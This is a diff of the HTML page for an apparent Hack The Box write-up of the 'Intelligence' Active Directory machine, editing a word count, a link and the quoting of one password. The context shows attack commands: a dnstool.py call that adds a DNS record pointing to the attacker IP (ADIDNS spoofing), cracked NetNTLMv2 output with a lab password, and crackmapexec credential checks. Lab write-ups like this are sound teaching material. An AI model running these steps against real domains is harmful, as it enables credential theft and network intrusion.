@@ -19,7 +19,7 @@
 <meta itemprop=name content="Intelligence">
 <meta itemprop=description content="Hack The Box. Windows. Medium machine. This machine presents an Active Directory (AD) environment to perform user enumeration, network poisoning and a Silver Ticket attack. Some scripting, DNS operations, AD attacks and BloodHound basics are needed to compromise this machine. This write-up uses a custom Go script to fuzz for files in a web server"><meta itemprop=datePublished content="2021-11-27T00:00:00+01:00">
 <meta itemprop=dateModified content="2021-11-27T00:00:00+01:00">
-<meta itemprop=wordCount content="2519">
+<meta itemprop=wordCount content="2527">
 <meta itemprop=keywords content="dns,smb,bloodhound,metadata,password-spray,active-directory,silver-ticket-attack,hash-cracking,">
 <meta name=twitter:card content="summary">
 <meta name=twitter:title content="Intelligence">
@@ -472,7 +472,7 @@ Import-Module ActiveDirectory
   } <span style=color:#66d9ef>catch</span> { }
 }
 </code></pre></div><p>Basically, what it is doing is checking inside LDAP for subdomains like <code>web*.intelligence.htb</code> and making a request using the credentials of <code>Ted.Graves</code> (every 5 minutes). Recall that one PDF file was talking this script.</p>
-<p>This time, we can add a subdomain called <code>webrocky.intelligence.htb</code> to the DNS using <code>Tiffany.Molina</code>&rsquo;s credentials that points to our attacker IP address:</p>
+<p>This time, we can add a subdomain called <code>webrocky.intelligence.htb</code> to the DNS using <code>Tiffany.Molina</code>&rsquo;s credentials that points to our attacker IP address (also known as ADIDNS <em>Spoofing</em>, more information <a href=https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/adidns-spoofing>here</a>):</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ python3 dnstool.py -u <span style=color:#e6db74>&#39;intelligence.htb\Tiffany.Molina&#39;</span> -p NewIntelligenceCorpUser9876 -a add -t A -d 10.10.17.44 -r webrocky.intelligence.htb 10.10.10.248 
 [-] Connecting to host...
 [-] Binding to host
@@ -495,7 +495,7 @@ Mr.Teddy         (Ted.Graves)
 Use the &#34;--show --format=netntlmv2&#34; options to display all of the cracked passwords reliably 
 Session completed.
 </code></pre></div><p>And we found the password. Let&rsquo;s see if the credentials are valid using <code>crackmapexec</code>:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ crackmapexec smb 10.10.10.248 -u Ted.Graves -p <span style=color:#e6db74>&#39;Mr.Teddy&#39;</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ crackmapexec smb 10.10.10.248 -u Ted.Graves -p Mr.Teddy
 SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False) 
 SMB         10.10.10.248    445    DC               [+] intelligence.htb\Ted.Graves:Mr.Teddy
 </code></pre></div><h2 id=performing-a-silver-ticket-attack>Performing a Silver Ticket attack</h2>
